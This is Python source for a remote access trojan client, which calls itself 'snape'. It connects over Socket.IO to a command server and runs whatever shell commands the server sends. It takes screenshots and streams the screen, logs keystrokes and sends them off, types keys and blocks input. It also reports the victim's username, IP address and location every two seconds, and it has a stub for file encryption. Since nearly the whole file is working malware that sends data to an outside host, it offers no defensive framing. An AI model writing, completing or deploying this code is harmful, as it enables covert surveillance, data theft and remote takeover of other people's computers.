import socketio
import atexit
from time import sleep
import os
import getpass
import pytz
import tkinter as tk
import urllib
import requests
import win32gui
import codecs
try:
  import win32gui
except:
  pass
import requests
from pygame import mixer
import json
import asyncio
import threading
import platform
try:
  #from pynput.mouse import Controller
  pass
except:
  pass
from tkinter.simpledialog import askstring
import webbrowser
import time
import sys
import random
from datetime import datetime
import json
import getpass
import tempfile
import keyboard
from PIL import ImageGrab
import requests
import tkinter.messagebox as tkm
import tkinter#​
import subprocess
from cryptography.fernet import Fernet
import io
import pyscreenshot as imagegrab

mouse_input_enabled = True
STORAGE_SERVER = 'https://storageserver.posydon.repl.co'
MAIN_SERVER = 'https://dumbledoor.posydon.repl.co'
TOKEN = 'f056c72b2110f7'

sio = socketio.Client() #conecting to server
sio.connect(MAIN_SERVER, wait_timeout = 10)

#reading file with snape client identification
try:
  with open('id.txt', 'r') as file:
    snape_id = file.read()
except:
  with open('id.txt', 'w') as file:
    id_temp = ''
    for i in range(0, 10):
      id_temp+=str(random.randint(0, 9))+";"
      
    file.write(id_temp)
    snape_id = id_temp
  file.close()

#start socketio client event handlers:

#handler for basic connection
@sio.on('connect')
def on_connect():
  print('Connected to server')

#debug handler
@sio.on('message')
def on_my_response(data): 
  print('Received from server: ', data)

#handler for shell commands
@sio.on('shell')
def shell(data):
  if data['id'] == snape_id:
    try:
      output = subprocess.check_output(data['command'], shell=True)
      output_str = output.decode('utf-8')
      sio.emit('response', data={'output': output_str, 'command': data['command'], 'id': snape_id, 'api': str(data['api'])})
    except Exception as e:
      sio.emit('response', data={'output': str(e)+"\n'Bad Dobby! Bad Dobby!'", 'command': data['command'], 'id': snape_id, 'api': str(data['api'])}) 

#handler for curses
@sio.on('command')
def command(data):
  print(data)
  if data['id'] == snape_id:
    command = data['command']
    try:
      param1 = data['param1']
    except:
      param1 = None
    try:
      param2 = data['param2']
    except:
      param2 = None
    try:
      param3 = data['param3']
    except:
      param3 = None
    try:
      param4 = data['param4']
    except:
      param4 = None
    api = data['api']
      
    for i in range(0, int(data['repeat'])):
      execution_thread = threading.Thread(target=execute, args=[command, param1, param2, param3, param4, api], daemon=True)
      execution_thread.start()

#End socketio event client handlers, start curse sorting and execution
def execute(command, param1, param2, param3, param4, api):
  match command:
    case 'msgbox':
      dobby69(command, api)
      msg(param1, param2, param3, api)
      
    case 'encrypt':
      if param1 == 'current':
        param1 = os.getcwd()
      #encrypt(param1, param2)
      #in development

    case 'screen-feed':
      start_screen_feed()
      
    case 'screenshot':
      screenshot()

    case 'sound':
      play_sound()

    case 'dio':
      dobby69(command, api)
      diologue_top(param1, param2, api)

    case 'keyboard-write':
      keyboard_write(param1)
    
    case 'keyboard-send':
      keyboard_send(param1)

    case 'keyboard-message':
      print('message')
      write_message(text=param1, delay=param2, save=eval(param3), name=param4)

    case 'mouse_disable':
      disable_mouse_input()

    case 'mouse_enable':
      enable_mouse_input()

    case 'temp':
      temp()

    case 'open_url':
      url_open(param1)


#End curse sorting, start dumbledoor server-communication functions
      
#this function is for responses that take an arbitrary time
#to send data, are sent to server log to not disrupt 
#dumbledoor terminal
def send_log(data):
  sio.emit('log', data={'content': data})

def dobby69(command, api): #arbitrary time response warning (dobby 69 response code)
  sio.emit('response', data={'output': 'dobby 69', 'command': command, 'id': snape_id, 'api': str(api)})
#for sending data that will be delivered speedily
#and does not risk disrupting dumbledoor terminal
def respond(data, api):
  sio.emit('response', data={'output': data, 'api': str(api)})

#End communication functions, start main curse function definitions:
def url_open(url):
  webbrowser.open(url)
  
def wait_keyboard():
  for i in range(150):
    keyboard.block_key(i) 
    
def play_music(file):
  mixer.init()
  mixer.music.load(file)
  mixer.music.play()
  return 1

def play_sound():
  response = requests.get(f"{MAIN_SERVER}/mp3")
  if response.status_code == 200:
      with open('file.mp3', 'wb') as f:
          f.write(response.content)
          send_log(f'{snape_id}: File downloaded successfully')
  else:
      send_log(f'{snape_id}: Failed to download file')
  send_log(f"mp3 file played with exit code: {play_music('file.mp3')}")
  os.remove('file.mp3')

def on_move(x, y):
    global mouse_input_enabled
    return mouse_input_enabled

# Mouse click event handler
def on_click(x, y, button, pressed):
    global mouse_input_enabled
    return mouse_input_enabled

# Mouse scroll event handler
def on_scroll(x, y, dx, dy):
    global mouse_input_enabled
    return mouse_input_enabled

# Mouse listener instance
# listener = mouse.Listener(
#     on_move=on_move,
#     on_click=on_click,
#     on_scroll=on_scroll
# )

# Function to disable mouse input
def disable_mouse_input():
    global listener, mouse_input_enabled
    mouse_input_enabled = False
    listener.stop()

# Function to enable mouse input
def enable_mouse_input():
    global listener, mouse_input_enabled
    mouse_input_enabled = True
    listener.start()

def temp():
  os.chdir(tempfile.gettempdir())

def start_screen_feed():
  while True:
      # Capture a screenshot of the screen
      screenshot = ImageGrab.grab()
  
      # Convert the screenshot to JPEG format
      buffer = io.BytesIO()
      screenshot.save(buffer, 'JPEG', quality=80)
      buffer.seek(0)
  
      # Send the JPEG-encoded screenshot to the server
      requests.post(f'{MAIN_SERVER}/screen-feed', data=buffer.read())
  
      # Wait for a short period of time before capturing the next screenshot
      time.sleep(0.1)

def diologue_top(title, message, api):
  global snape_id
  sio.emit('response', data={'output': 'dobby 69', 'id': snape_id, 'api': 'True'})
  root = tkinter.Tk()
  root.wm_attributes('-topmost', 1)
  root.withdraw()
  prompt = askstring(title, message, parent=root)
  send_log(f"user response: {prompt}")
  output = f'\n\tmessage: {message}\n\ttitle:{title}\n\tresponse: {prompt}'
  sio.emit('response', data={'output': output, 'id': snape_id, 'api': api})
  root.destroy()

def keyboard_write(text):
  keyboard.write(text, delay=0.2)

def keyboard_send(shortcut):
  keyboard.send(shortcut)

def write_message(text, delay, save=False, name="README", editor="notepad"):
  os.system("START " + editor)
  sleep(0.4)  # Wait for Notepad to open
  notepad_handle = win32gui.FindWindow(None, "Untitled - Notepad")  # Find the handle of the Notepad window
  win32gui.SetForegroundWindow(notepad_handle)  # Set Notepad window to foreground
  keyboard.write(text, delay=float(delay))
  if save:
    keyboard.send("ctrl+s")
    sleep(0.5)
    keyboard.write(name)
    keyboard.send("enter")
  else:
    pass

def screenshot():
  global snape_id
  try:
    print('screenshot')
    screenshot = ImageGrab.grab()
    screenshot.save('shot.png')
    with open('shot.png', 'rb') as image_file:
      response = requests.post(f'{MAIN_SERVER}/upload', files={'image': image_file})
      send_log(f"server response to screenshot upload: {response}")
    os.remove('shot.png')
  except Exception as e:
    send_log(f'screenshot failed, with exception as follows: \n {e}')

def msg(title, message, type, api):
  global snape_id
  try:
    root = tkinter.Tk()
    root.wm_attributes('-topmost', 1)
    root.withdraw()
    if type == 'error':
      tkm.showerror(title, message, parent=root)
    elif type == 'info':
      tkm.showinfo(title, message, parent=root)
    elif type == 'warning':
      tkm.showwarning(title, message, parent=root)
    root.destroy()
    send_log(f"client {snape_id} closed messagebox>[\n\ttype: {type}\n\ttitle: {title}\n\tmessage: {message}\n]")
  except Exception as e:
    sio.emit('response', data={'output': f"error: {e}", 'api': api})
#keylogger functions: 

def send_key(key):
    data = {'key': key}
    response = requests.post(MAIN_SERVER + '/key', json=data)
    if response.status_code != 200:
        print('Error sending key:', response.text)

def handle_keypress(event):
    send_key(event.char)

def main_keylogger():
    # Create a hidden Tkinter window
    root = tk.Tk()
    root.withdraw()
    # Bind the key press event to the handle_keypress function
    root.bind('<Key>', handle_keypress)
    # Wait for a variable to change (this will block the program)
    tk.mainloop()

def open_url(url):
  webbrowser.open(url, 2, True)
#End main curse functions, start server check-in loop

url = f'http://ipinfo.io/json?token={TOKEN}'
response_ipinfo = eval(requests.get(url, headers = {'User-agent': f'snape@{snape_id}'}).text)
ip = requests.get('https://api.ipify.org').content.decode('utf8')
data = response_ipinfo

city = data['city'].replace(' ', '_')
country = data['country'].replace(' ', '_')
region = data['region'].replace(' ', '_')
longitude = data['loc'].split(',')[0]
latitude = data['loc'].split(',')[1]
postal = data['postal']
timezone = data['timezone']
while True:
  tz_NY = pytz.timezone('America/New_York')
  datetime_NY = datetime.now(tz_NY)
  time = datetime_NY.strftime('%H:%M:%S')
  
  system = platform.system()
  release = platform.release()
  version = platform.version()
  username = getpass.getuser()

  data_dict = {'id':str(snape_id), 'username': username, 'ip': str(ip), 'timezone': str(tz_NY), 'time': str(time), 'system': str(system), 'release': str(release), 'version': str(version), 'city': str(city), 'country': str(country), 'region': str(region), 'longitude': str(longitude), 'latitude': str(latitude), 'postal': str(postal)}
  try:
    sio.emit('check_in', data_dict)
    print('sent')
  except:
    print('failed to send')
  sleep(2)
